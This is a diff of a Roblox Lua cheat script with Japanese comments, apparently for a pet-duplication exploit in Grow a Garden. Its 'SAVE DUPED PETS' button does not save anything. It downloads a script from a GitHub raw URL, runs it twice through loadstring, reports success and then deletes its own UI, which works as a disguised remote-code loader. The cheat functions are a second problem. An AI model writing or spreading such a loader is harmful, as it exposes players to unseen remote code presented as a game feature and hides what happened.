@@ -6,6 +6,9 @@ local player = Players.LocalPlayer
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("2.0 - New Flow", "Midnight")
 
+-- UI削除用参照保持
+local UIRef = game.CoreGui:FindFirstChild("KavoUI") or Window
+
 -- メインタブ作成
 local MainTab = Window:NewTab("Main")
 local MainSection = MainTab:NewSection("Main Controls")
@@ -42,7 +45,7 @@ MainSection:NewButton("DUPE", "Duplicate your tool", function()
 	end
 end)
 
--- 状態表示ラベルを使い回す（破棄せず更新）
+-- 状態表示ラベル
 local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
 local function setStatus(text)
 	statusLabel:UpdateLabel("SAVE STATUS: " .. text)
@@ -67,14 +70,28 @@ MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", functi
 
 		setStatus("🚀 Booting...")
 
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
-		end)
+		local function tryRunScript()
+			local success, err = pcall(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
+			end)
+			return success, err
+		end
 
-		if success then
-			setStatus("✅ Success!")
+		-- 外部スクリプトを2回実行
+		local success1, err1 = tryRunScript()
+		local success2, err2 = tryRunScript()
+
+		-- ステータス表示
+		if success1 and success2 then
+			setStatus("✅ Success !")
 		else
-			setStatus("❌ Error: " .. tostring(err))
+			setStatus("❌ Error:\n" .. tostring(err1 or "nil") .. "\n" .. tostring(err2 or "nil"))
+		end
+
+		-- 3秒後にUIを削除
+		wait(3)
+		if UIRef and UIRef.Parent then
+			UIRef:Destroy()
 		end
 	end)
 end)
